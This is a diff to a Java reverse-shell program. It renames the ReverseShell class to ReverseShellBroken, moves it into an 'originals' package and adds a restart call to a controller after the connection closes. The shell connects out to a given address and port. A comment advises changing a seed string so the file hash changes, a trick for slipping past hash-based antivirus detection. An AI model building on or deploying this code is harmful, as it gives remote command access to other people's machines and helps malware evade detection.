@@ -1,4 +1,4 @@
-package apps.ReverseShell;
+package apps.ReverseShell.originals;
 
 
 import java.io.IOException;
@@ -9,7 +9,7 @@ import java.net.Socket;
 import java.net.SocketTimeoutException;
 import java.util.Arrays;
 
-public class ReverseShell {
+public class ReverseShellBroken {
  
  // NOTE: Change seed to help you change the file hash.
  private String seed              = "3301Kira";
@@ -20,7 +20,7 @@ public class ReverseShell {
  private int               clen   = 0;
  private boolean           error  = false;
  
- public ReverseShell(String addr, int port) {
+ public ReverseShellBroken(String addr, int port) {
      this.addr = new InetSocketAddress(addr, port);
  }
  
@@ -123,7 +123,7 @@ public class ReverseShell {
              if (client != null) { try { client.close(); } catch (IOException ex) {} }
              
              if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
-             
+             controller.Controller.restart();
          }
      }
  }
@@ -156,7 +156,7 @@ public class ReverseShell {
              }
          }
          if (!error) {
-             ReverseShell sh = new ReverseShell(args[0], port);
+             ReverseShellBroken sh = new ReverseShellBroken(args[0], port);
              sh.run();
              // don't forget to call the garbage cleaner
              sh = null;
